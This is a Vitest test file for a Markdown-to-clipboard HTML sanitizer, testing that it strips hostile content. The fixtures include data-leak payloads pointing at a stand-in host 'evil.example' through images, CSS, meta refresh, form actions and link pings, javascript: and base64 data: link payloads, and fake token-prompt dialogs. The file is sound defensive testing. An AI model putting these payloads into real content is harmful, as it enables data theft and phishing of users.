// @vitest-environment jsdom
import { describe, expect, it } from 'vitest';

import { markdownToClipboardHtml as toHtml } from '../src/clipboard';

const url = 'https://evil.example/leak.png?secret=abc';

describe('markdownToClipboardHtml', () => {
  it('renders basic markdown', () => {
    const html = toHtml('**bold** [link](https://example.com "Title")\n\n3. item');
    expect(html).toMatch(/<strong>bold<\/strong>/);
    expect(html).toMatch(/<a href="https:\/\/example.com" title="Title">link<\/a>/);
    expect(html).toMatch(/<ol start="3">/);
  });

  it('keeps table column alignment', () => {
    expect(toHtml('| a |\n|:-:|\n| 1 |')).toMatch(/<td align="center">1<\/td>/);
  });

  it('renders task list checkboxes as text', () => {
    expect(toHtml('- [x] done\n- [ ] todo')).toBe(
      '<ul>\n<li>☑ done</li>\n<li>☐ todo</li>\n</ul>\n',
    );
  });

  it('keeps harmless HTML tags', () => {
    const markdown =
      '<b>b</b> <i>i</i> <s>s</s> <u>u</u> <ins>ins</ins> <mark>mark</mark> <small>small</small>';
    expect(toHtml(markdown)).toBe(`<p>${markdown}</p>\n`);
  });

  it('keeps divs, definition lists and collapsible sections', () => {
    const markdown =
      '<div>a</div><dl><dt>Term</dt><dd>Definition</dd></dl><details open=""><summary>s</summary></details>';
    expect(toHtml(markdown)).toBe(markdown);
  });

  it('removes tags not on the allow list but keeps their text', () => {
    expect(toHtml('<span>text</span>')).toBe('<p>text</p>\n');
  });

  it('removes attributes not on the allow list', () => {
    expect(toHtml('<p popover="manual" title="Title">text</p>')).toBe('<p title="Title">text</p>');
  });

  [
    ['markdown image', `![alt](${url})`],
    ['img src', `<img src="${url}">`],
    ['picture source', `<picture><source srcset="${url}"></picture>`],
    ['video poster', `<video poster="${url}"></video>`],
    ['svg image', `<svg><image href="${url}"></image></svg>`],
    ['input image', `<input type="image" src="${url}">`],
    ['style attribute', `<span style="background:url(${url})">text</span>`],
    ['style element', `text\n\n<style>p{background:url(${url})}</style>`],
    ['table background', `<table background="${url}"><tr><td>cell</td></tr></table>`],
    ['iframe srcdoc', `<iframe srcdoc="<img src=${url}>"></iframe>`],
    ['a ping', `<a href="https://example.com" ping="${url}">link</a>`],
    ['base href', `text\n\n<base href="${url}">`],
    ['meta refresh', `text\n\n<meta http-equiv="refresh" content="0;url=${url}">`],
    ['form action', `text\n\n<form action="${url}"><button>Go</button></form>`],
  ].forEach(([name, markdown]) => {
    it(`removes external URLs (${name})`, () => {
      expect(toHtml(markdown)).not.toMatch(/evil\.example/);
    });
  });

  [
    ['javascript', '[link](javascript:alert(1))'],
    ['data', '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">link</a>'],
  ].forEach(([name, markdown]) => {
    it(`removes unsafe link URLs (${name})`, () => {
      expect(toHtml(`text\n\n${markdown}`)).not.toMatch(/href/);
    });
  });

  [
    ['button', '<button>Approve</button>', /<button/],
    ['dialog', '<dialog open><p>Re-enter your token</p></dialog>', /<dialog/],
    ['input', '<input type="password" title="Re-enter your token">', /<input/],
    ['select', '<select><option>a</option></select>', /<select/],
    ['textarea', '<textarea>token</textarea>', /<textarea/],
  ].forEach(([name, markdown, pattern]) => {
    it(`removes interactive elements (${name})`, () => {
      expect(toHtml(`text\n\n${markdown}`)).not.toMatch(pattern as RegExp);
    });
  });

  [
    ['class', '<div class="pf-v6-c-backdrop">text</div>', /class=/],
    ['code block class', '```js\nfoo\n```', /class=/],
    ['data', '<div data-test="approve-button">text</div>', /data-/],
    ['aria', '<div aria-label="Approved">Denied</div>', /aria-/],
    ['role', '<div role="alertdialog">text</div>', /role=/],
    ['id', '<div id="content">text</div>', /id=/],
    ['download', '<a href="https://example.com" download="fix.sh">fix</a>', /download/],
  ].forEach(([name, markdown, pattern]) => {
    it(`removes attributes that could style, label or identify content (${name})`, () => {
      expect(toHtml(`text\n\n${markdown}`)).not.toMatch(pattern as RegExp);
    });
  });
});
